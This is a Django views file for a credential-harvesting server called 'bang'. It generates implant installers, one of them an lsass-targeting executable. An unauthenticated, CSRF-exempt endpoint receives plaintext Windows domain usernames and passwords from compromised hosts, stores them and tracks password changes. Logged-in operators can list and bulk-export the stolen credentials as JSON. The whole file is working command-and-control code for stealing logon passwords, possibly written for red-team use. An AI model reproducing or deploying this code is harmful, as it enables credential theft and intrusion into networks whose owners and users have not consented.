import base64
import json
import logging
import socket
import uuid

from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from django.core import serializers
from django.http import HttpResponse, HttpResponseNotFound, HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_GET, require_POST, require_http_methods

from .models import AuthenticationToken, LogonCredential
from .utils import configure_bang_installer

LOGGER = logging.getLogger("django")

# ignored logon usernames for machines/services
IGNORED_LOGONS = [
    "IUSR",
    "_TBAL_{68EDDCF5-0AEB-4C28-A770-AF5302ECA3C9}",
]
SERVICE_LOGON_PREFIXES = [
    "UMFD-",
    "DWM-",
    "sshd_",
]


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def index(request):
    # only show the most recent 1000 logons
    #   (TODO: look into pagination)
    credentials = LogonCredential.objects.order_by("-last_used")[:1000]
    return render(
        request, "bang/index.html", {"credentials": credentials}
    )


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def tokens(request):
    tokens = AuthenticationToken.objects.order_by("-last_used")
    return render(
        request, "bang/tokens.html", {"tokens": tokens}
    )

@require_POST
@login_required(login_url="/signin/", redirect_field_name=None)
def revoke(request, token_id):
    token = get_object_or_404(AuthenticationToken, pk=token_id)
    token.revoked = not token.revoked
    token.save()
    return HttpResponseRedirect(reverse("tokens"))


@require_http_methods(["GET", "POST"])
@login_required(login_url="/signin/", redirect_field_name=None)
def config(request):
    tokens = [str(token) for token in AuthenticationToken.objects.order_by("token").filter(revoked=False)]
    template_data = {
        "target": "",
        "module_name": "",
        "hostname": "",  # TODO: determine own hostname?
        "auth_tokens": tokens,
    }
    if request.method == "GET":
        return render(request, "bang/config.html", template_data)
    try:
        target = request.POST["target"]
        module_name = request.POST["module_name"]
        hostname = request.POST["hostname"]
        auth_token = request.POST["auth_token"]
    except KeyError:
        return render(request, "bang/config.html")
    template_data.update({k: v for k, v in request.POST.items() if k in template_data})
        
    if not all((module_name, hostname)):
        template_data["fail_msg"] = "Missing configuration data!"
        return render(request, "bang/config.html", template_data, status=400)

    if not auth_token:
        auth_token = str(uuid.uuid4())
    try:
        _, _ = AuthenticationToken.objects.get_or_create(token=auth_token)
        installer = configure_bang_installer(
            hostname=hostname,
            auth_token=auth_token,
            module_name=module_name,
            target=target,
        )
        filename = f"bang_{auth_token}"
        if target == "lsass":
            filename += ".exe"
        response = HttpResponse(installer, content_type="application/octet-stream")
        response["Content-Disposition"] = f"inline; filename={filename}"
        return response
    except FileNotFoundError:
        template_data["fail_msg"] = "Missing unconfigured installer!"
        return render(request, "bang/config.html", template_data, status=404)
    except:
        template_data["fail_msg"] = "Configuration failed!"
        return render(request, "bang/config.html", template_data, status=500)


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def export(request):
    creds = []
    for cred in LogonCredential.objects.all():
        creds.append(
            {
                "domain": cred.domain,
                "username": cred.username,
                "password": cred.password,
                "last_hostname": cred.last_hostname,
                "last_used": str(cred.last_used),
                "last_changed": str(cred.last_changed),
            }
        )
    timestr = timezone.now().strftime("%Y%m%d-%H%M%S")
    response = HttpResponse(json.dumps(creds, sort_keys=True, indent=4), content_type="application/json")
    response["Content-Disposition"] = f"inline; filename=bang_{timestr}.json"
    return response


@require_POST
@csrf_exempt
def log(request):
    time_now = timezone.now()

    # grab remote hostname
    if forwarded := request.META.get("HTTP_X_FORWARDED_FOR"):
        remote_host = forwarded.split(",")[0]
    else:
        remote_host = request.META.get("REMOTE_ADDR", "")
    try:
        remote_host, _, _ = socket.gethostbyaddr(remote_host)
    except:
        pass

    # parse JSON
    try:
        auth_data = json.loads(request.body)
        LOGGER.info(auth_data)
    except:
        return HttpResponse(status=400)

    # validate auth token
    if (auth_token := auth_data.get("auth_token")) is None:
        return HttpResponse(status=403)
    try:
        token = AuthenticationToken.objects.get(token=uuid.UUID(auth_token))
    except:
        return HttpResponse(status=403)
    if token.revoked:
        return HttpResponse(status=403)
    token.last_hostname = remote_host
    token.last_used = time_now
    token.save()

    # ignore service logins
    username = auth_data.get("username")
    if username in IGNORED_LOGONS or any(
        username.startswith(svc_pfx) for svc_pfx in SERVICE_LOGON_PREFIXES
    ):
        return HttpResponse(status=200)

    # if the host is not joined to a domain, use the remote hostname as the "domain"
    domain = auth_data.get("domain")
    if domain in (None, "", "(none)"):
        domain = remote_host

    # save credential
    try:
        credential, _ = LogonCredential.objects.get_or_create(
            domain=domain,
            username=auth_data.get("username"),
        )
    except:
        return HttpResponse(status=500)
    credential.last_hostname = remote_host
    credential.last_used = time_now
    if (new_password := auth_data.get("password")) != credential.password:
        credential.password = new_password
        credential.last_changed = time_now
    credential.save()

    return HttpResponse(status=200)
